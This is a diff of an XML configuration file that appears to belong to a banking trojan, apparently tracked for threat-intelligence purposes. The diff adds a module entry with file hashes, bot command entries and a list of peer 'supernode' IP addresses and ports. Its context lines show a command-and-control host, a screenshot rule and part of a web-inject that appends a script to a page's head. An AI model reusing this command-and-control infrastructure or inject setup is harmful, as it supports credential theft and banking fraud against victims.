@@ -21,8 +21,25 @@
 -->
 
 <settings>
-  <modules/>
-  <commands/>
+  <modules>
+    <module>
+      <sha256>60a13b2201fc4c1f9f60c3d660e873aeba5ba835e37e16e08171dcf6bdb7bf68</sha256>
+      <sha1>d79a0b4f838df2b52110af73bed6834753dd7916</sha1>
+      <md5>97cf4507315546c5105db08e017f2412</md5>
+      <timestamp>2017-12-27T15:32:56+00:00</timestamp>
+      <architecture>32</architecture>
+      <name>n/a</name>
+      <crc>0x1d1df6f5</crc>
+    </module>
+  </modules>
+  <commands>
+    <cmd id="457136" type="19">
+      <fs/>
+    </cmd>
+    <cmd id="493641" type="9">
+      <fs/>
+    </cmd>
+  </commands>
   <config>
     <httpshots>
       <url onget="1" onpost="1" type="deny">\.(gif|png|jpg|css|swf|ico|js)($|\?)</url>
@@ -362,4 +379,34 @@ document.head.appendChild(jq_plgn_ext);\1</replacement>
       <ip>67.207.142.38</ip>
     </host>
   </c2>
+  <supernodes>
+    <node>
+      <ip>41.193.159.41</ip>
+      <port>444</port>
+    </node>
+    <node>
+      <ip>41.193.159.41</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>104.231.38.241</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>5.226.111.135</ip>
+      <port>444</port>
+    </node>
+    <node>
+      <ip>151.0.179.218</ip>
+      <port>8443</port>
+    </node>
+    <node>
+      <ip>47.42.53.110</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>179.108.87.11</ip>
+      <port>443</port>
+    </node>
+  </supernodes>
 </settings>
